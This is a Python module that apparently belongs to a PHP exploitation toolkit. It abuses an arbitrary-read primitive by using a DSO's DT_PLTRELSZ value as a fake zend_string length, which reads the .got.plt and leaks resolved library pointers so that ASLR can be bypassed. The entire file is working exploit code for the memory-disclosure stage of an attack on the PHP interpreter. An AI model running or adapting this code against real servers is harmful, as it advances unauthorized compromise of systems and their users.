#!/usr/bin/env python3
# INDEX: read dso .got.plt via dt_pltrelsz length | all | needs zend_string read backend
"""Shared DT_PLTRELSZ fake-string-length GOT read.

Read a DSO's .got.plt by abusing DT_PLTRELSZ's d_val (~85KB) as a fake
zend_string length so that val[] spans the rest of .dynamic into .got.plt and
exposes every resolved external pointer. The .dynamic address is resolved via
the shared ELF resolver (set_resolver); the low-level reads go through the
injected ``read_fn``. Pure stdlib, safe under python3 -I.

    read_got_via_pltrelsz(read_fn, elf_base) -> (got_bytes, data_start) | (None, None)
"""
from __future__ import annotations

import struct


_resolver = None


def set_resolver(mod):
    """Install the ELF resolver whose _read_elf_header / _elf_resolve_symbols
    supply the PT_DYNAMIC address."""
    global _resolver
    _resolver = mod


def read_got_via_pltrelsz(read_fn, elf_base):
    """Resolve PT_DYNAMIC for the ELF at `elf_base`, read .dynamic via a
    fake-string len anchor, find DT_PLTRELSZ and read the GOT with its d_val as
    the fake string length. Returns (got_bytes, data_start) or (None, None)."""
    epn = _resolver._read_elf_header(elf_base)
    if epn is None:
        return None, None
    syms = _resolver._elf_resolve_symbols(elf_base, epn, [])
    dynaddr = syms.get('__dynamic__') if syms else None
    if not dynaddr:
        return None, None

    dyn_data = dyn_base = None
    for k in (0x08, 0x18, 0x28, 0x38, 0x48):
        r = read_fn(dynaddr - k, timeout=3)
        if r is None:
            continue
        slen, sdata = r
        if slen < 64 or slen > 0x200000 or len(sdata) < 64:
            continue
        skip = max(0, k - 0x18)
        cand = sdata[skip:skip + min(1024, len(sdata) - skip)]
        if len(cand) >= 16:
            t0 = struct.unpack_from('<Q', cand, 0)[0]
            if t0 == 0 or (100 < t0 < 0x6FFFFEF5):
                continue
        dyn_data = cand
        dyn_base = dynaddr - k + 0x18 + skip
        break
    if dyn_data is None:
        return None, None

    pltrelsz_off = None
    for di in range(len(dyn_data) // 16):
        t = struct.unpack_from('<Q', dyn_data, di * 16)[0]
        if t == 0:
            break
        if t == 2:        # DT_PLTRELSZ
            pltrelsz_off = di * 16 + 8
    if pltrelsz_off is None:
        return None, None

    pltrelsz_addr = dyn_base + pltrelsz_off
    r = read_fn(pltrelsz_addr - 0x10, timeout=5)
    if r is None:
        return None, None
    return r[1], pltrelsz_addr + 0x08
